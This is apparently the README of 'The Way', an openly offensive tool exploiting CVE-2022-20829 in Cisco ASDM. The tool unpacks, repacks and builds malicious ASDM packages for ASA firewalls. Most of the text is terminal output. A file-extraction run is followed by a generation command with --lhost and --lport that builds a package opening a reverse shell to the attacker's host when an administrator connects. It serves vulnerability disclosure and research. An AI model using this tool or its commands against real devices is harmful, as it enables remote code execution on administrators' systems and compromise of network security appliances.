# The Way

The Way is a tool for unpacking, repacking, and creating malicious Cisco [Adaptive Security Device Manager](https://www.cisco.com/c/en/us/products/security/adaptive-security-device-manager/index.html) (ASDM) packages. ASDM is the Java-based administrative GUI for Adaptive Security Appliance (ASA) systems (e.g. firewalls and VPNs). The ASDM package is hosted on the ASA and sub-components are downloaded each time an administrator connects to the ASA via ASDM. An attacker that can plant a malicious ASDM package on the ASA can achieve code execution on administrator systems.

The vulnerability is the result of a few issues. Most specifically, malicious ASDM packages are possible due to the lack of package signing by Cisco. An attacker that can craft a proper package and computer a file hash can load arbitrary packages on the ASA. This has been assigned CVE-2022-20829.

A demonstration of exploitation can be found on YouTube here: https://www.youtube.com/watch?v=ydjD7lIR9Bg

## File Extraction Example

```
albinolobster@ubuntu:~/gh_theway/build$ ./theway -ef ~/Desktop/cisco/asdm-7171-152.bin 

                         where were they going without ever knowing
           .              __.....__ 
         .'|          .-''         '.                   _     _     .-.          .- 
     .| <  |         /     .-''"'-.  `.           /\    \\   //      \ \        / /
   .' |_ | |        /     /________\   \          `\\  //\\ //  __    \ \      / /
 .'     || | .'''-. |                  |            \`//  \'/.:--.'.   \ \    / /
'--.  .-'| |/.'''. \\    .-------------'             \|   |// |   \ |   \ \  / /
   |  |  |  /    | | \    '-.____...---.              '     `" __ | |    \ `  /
   |  |  | |     | |  `.             .'                      .'.''| |     \  /
   |  '.'| |     | |    `''-...... -'     jbaines-r7        / /   | |_    / /
   |   / | '.    | '.                   CVE-2022-20829      \ \._,\ '/|`-' /
   `'-'  '---'   '---'                        🦞             `--'  `"  '..'


[+] Loading /home/albinolobster/Desktop/cisco/asdm-7171-152.bin
-> Magic: ASDM IMG7.17(1)152
-> Description: Device Manager Version 7.17(1)152
-> File length: 3116f94
-> File hash: 7a2c62b3f1781655cccbb6cf9914552c
-> Compilation date: Fri, 04 Feb 2022 10:43:43 GMT
-> Manifest Entries: 13
-> Entry: 0
58110500006c0d0014000000
	-> Entry length: 14
	-> Entry file: asdm50-install.msi
	-> Data offset: 51158
	-> Data size: d6c00
-> Entry: 1
f80200003201000014000000
	-> Entry length: 14
	-> Entry file: asdmversion.html
	-> Data offset: 2f8
	-> Data size: 132
-> Entry: 2
2c0400002b0d050010000000
	-> Entry length: 10
	-> Entry file: dm-launcher.dmg
	-> Data offset: 42c
	-> Data size: 50d2b
-> Entry: 3
58110500006c0d0010000000
	-> Entry length: 10
	-> Entry file: dm-launcher.msi
	-> Data offset: 51158
	-> Data size: d6c00
-> Entry: 4
587d1200d6eef80208000000
	-> Entry length: 8
	-> Entry file: pdm.sgz
	-> Data offset: 127d58
	-> Data size: 2f8eed6
-> Entry: 5
306c0b033201000010000000
	-> Entry length: 10
	-> Entry file: pdmversion.html
	-> Data offset: 30b6c30
	-> Data size: 132
-> Entry: 6
646d0b03e70b000014000000
	-> Entry length: 14
	-> Entry file: public/asa-pix.gif
	-> Data offset: 30b6d64
	-> Data size: be7
-> Entry: 7
4c790b038a05000014000000
	-> Entry length: 14
	-> Entry file: public/asdm.jnlp
	-> Data offset: 30b794c
	-> Data size: 58a
-> Entry: 8
d87e0b03a305000014000000
	-> Entry length: 14
	-> Entry file: public/asdm32.gif
	-> Data offset: 30b7ed8
	-> Data size: 5a3
-> Entry: 9
7c840b03b805000014000000
	-> Entry length: 14
	-> Entry file: public/cert.jnlp
	-> Data offset: 30b847c
	-> Data size: 5b8
-> Entry: a
348a0b035d06000014000000
	-> Entry length: 14
	-> Entry file: public/cisco.gif
	-> Data offset: 30b8a34
	-> Data size: 65d
-> Entry: b
94900b03b5bb000018000000
	-> Entry length: 18
	-> Entry file: public/deployJava.js
	-> Data offset: 30b9094
	-> Data size: bbb5
-> Entry: c
4c4c0c03aafa010018000000
	-> Entry length: 18
	-> Entry file: public/dm-launcher.jar
	-> Data offset: 30c4c4c
	-> Data size: 1faaa
-> Entry: d
f8460e03441d000014000000
	-> Entry length: 14
	-> Entry file: public/index.html
	-> Data offset: 30e46f8
	-> Data size: 1d44
-> Entry: e
3c640e03140f010014000000
	-> Entry length: 14
	-> Entry file: public/jploader.jar
	-> Data offset: 30e643c
	-> Data size: 10f14
-> Entry: f
50730f039630000010000000
	-> Entry length: 10
	-> Entry file: public/lzma.jar
	-> Data offset: 30f7350
	-> Data size: 3096
-> Entry: 10
e8a30f0389c5010020000000
	-> Entry length: 20
	-> Entry file: public/retroweaver-rt-2.0.jar
	-> Data offset: 30fa3e8
	-> Data size: 1c589
-> Entry: 11
74691103ad05000014000000
	-> Entry length: 14
	-> Entry file: public/startup.jnlp
	-> Data offset: 3116974
	-> Data size: 5ad
-> Entry: 12
246f11037000000010000000
	-> Entry length: 10
	-> Entry file: version.prop
	-> Data offset: 3116f24
	-> Data size: 70
albinolobster@ubuntu:~/gh_theway/build$ ls -l ./output/
total 51164
-rw-rw-r-- 1 albinolobster albinolobster   879616 Apr 28 11:06 asdm50-install.msi
-rw-rw-r-- 1 albinolobster albinolobster      306 Apr 28 11:06 asdmversion.html
-rw-rw-r-- 1 albinolobster albinolobster   331051 Apr 28 11:06 dm-launcher.dmg
-rw-rw-r-- 1 albinolobster albinolobster   879616 Apr 28 11:06 dm-launcher.msi
-rw-rw-r-- 1 albinolobster albinolobster 49868502 Apr 28 11:06 pdm.sgz
-rw-rw-r-- 1 albinolobster albinolobster      306 Apr 28 11:06 pdmversion.html
-rw-rw-r-- 1 albinolobster albinolobster     3047 Apr 28 11:06 public%asa-pix.gif
-rw-rw-r-- 1 albinolobster albinolobster     1443 Apr 28 11:06 public%asdm32.gif
-rw-rw-r-- 1 albinolobster albinolobster     1418 Apr 28 11:06 public%asdm.jnlp
-rw-rw-r-- 1 albinolobster albinolobster     1464 Apr 28 11:06 public%cert.jnlp
-rw-rw-r-- 1 albinolobster albinolobster     1629 Apr 28 11:06 public%cisco.gif
-rw-rw-r-- 1 albinolobster albinolobster    48053 Apr 28 11:06 public%deployJava.js
-rw-rw-r-- 1 albinolobster albinolobster   129706 Apr 28 11:06 public%dm-launcher.jar
-rw-rw-r-- 1 albinolobster albinolobster     7492 Apr 28 11:06 public%index.html
-rw-rw-r-- 1 albinolobster albinolobster    69396 Apr 28 11:06 public%jploader.jar
-rw-rw-r-- 1 albinolobster albinolobster    12438 Apr 28 11:06 public%lzma.jar
-rw-rw-r-- 1 albinolobster albinolobster   116105 Apr 28 11:06 public%retroweaver-rt-2.0.jar
-rw-rw-r-- 1 albinolobster albinolobster     1453 Apr 28 11:06 public%startup.jnlp
-rw-rw-r-- 1 albinolobster albinolobster      112 Apr 28 11:06 version.prop
```

## Malicious Package Generation

The following generates a malicious ASDM package that, when uploaded to an ASA, will generate a reverse shell when an ASDM client connects to the ASA.

```
albinolobster@ubuntu:~/theway/bu$ ./theway -g --lhost 10.9.49.248 --lport 1270

                         where were they going without ever knowing
           .              __.....__ 
         .'|          .-''         '.                   _     _     .-.          .- 
     .| <  |         /     .-''"'-.  `.           /\    \\   //      \ \        / /
   .' |_ | |        /     /________\   \          `\\  //\\ //  __    \ \      / /
 .'     || | .'''-. |                  |            \`//  \'/.:--.'.   \ \    / /
'--.  .-'| |/.'''. \\    .-------------'             \|   |// |   \ |   \ \  / /
   |  |  |  /    | | \    '-.____...---.              '     `" __ | |    \ `  /
   |  |  | |     | |  `.             .'                      .'.''| |     \  /
   |  '.'| |     | |    `''-...... -'     jbaines-r7        / /   | |_    / /
   |   / | '.    | '.                   CVE-2022-20829      \ \._,\ '/|`-' /
   `'-'  '---'   '---'                        🦞             `--'  `"  '..'

[+] Compiling Payload using `javac PDMApplet.java SgzApplet.java`
[+] Creating JAR entries
[+] Compressing jar entries with `lzma -z jars`
[+] Adding sgz wrapper
[+] Flushing the pdm.sgz to disk
-> Sizeof manifest entry c
-> Files to package 
	-> asdm50-install.msi
14
asdm50-install.msi
	-> asdmversion.html
14
asdmversion.html
	-> dm-launcher.dmg
10
dm-launcher.dmg
	-> dm-launcher.msi
10
dm-launcher.msi
	-> pdm.sgz
8
pdm.sgz
	-> pdmversion.html
10
pdmversion.html
	-> public/asa-pix.gif
14
public/asa-pix.gif
	-> public/asdm.jnlp
14
public/asdm.jnlp
	-> public/asdm32.gif
14
public/asdm32.gif
	-> public/cert.jnlp
14
public/cert.jnlp
	-> public/cisco.gif
14
public/cisco.gif
	-> public/deployJava.js
18
public/deployJava.js
	-> public/dm-launcher.jar
18
public/dm-launcher.jar
	-> public/index.html
14
public/index.html
	-> public/jploader.jar
14
public/jploader.jar
	-> public/lzma.jar
10
public/lzma.jar
	-> public/retroweaver-rt-2.0.jar
20
public/retroweaver-rt-2.0.jar
	-> public/startup.jnlp
14
public/startup.jnlp
	-> version.prop
10
version.prop
-> Entries size: 254
	->Offset (asdm50-install.msi) (2f8 -> 2fc)
	->Offset (asdmversion.html) (2f8 -> 2fc)
	->Offset (dm-launcher.dmg) (2fc -> 300)
	->Offset (dm-launcher.msi) (300 -> 304)
	->Offset (pdm.sgz) (304 -> 7ed)
	->Offset (pdmversion.html) (7f0 -> 7f4)
	->Offset (public/asa-pix.gif) (7f4 -> 7f8)
	->Offset (public/asdm.jnlp) (7f8 -> 7fc)
	->Offset (public/asdm32.gif) (7fc -> 800)
	->Offset (public/cert.jnlp) (800 -> 804)
	->Offset (public/cisco.gif) (804 -> 808)
	->Offset (public/deployJava.js) (808 -> 80c)
	->Offset (public/dm-launcher.jar) (80c -> 810)
	->Offset (public/index.html) (810 -> 814)
	->Offset (public/jploader.jar) (814 -> 818)
	->Offset (public/lzma.jar) (818 -> 81c)
	->Offset (public/retroweaver-rt-2.0.jar) (81c -> 820)
	->Offset (public/startup.jnlp) (820 -> 824)
	->Offset (version.prop) (824 -> 891)
c1b7190c7426b2b72a6862c09cc19152

```

The Way will generate "test.final.bin", which can then be uploaded to the ASA.


## Credit

* [Malcolm Lashley](https://gist.github.com/mlashley/7d2c16e91fe37c9ab3b2352615540025): CVE-2021-1585
* [Fastball](https://www.youtube.com/watch?v=X5jlTlUTWfQ)
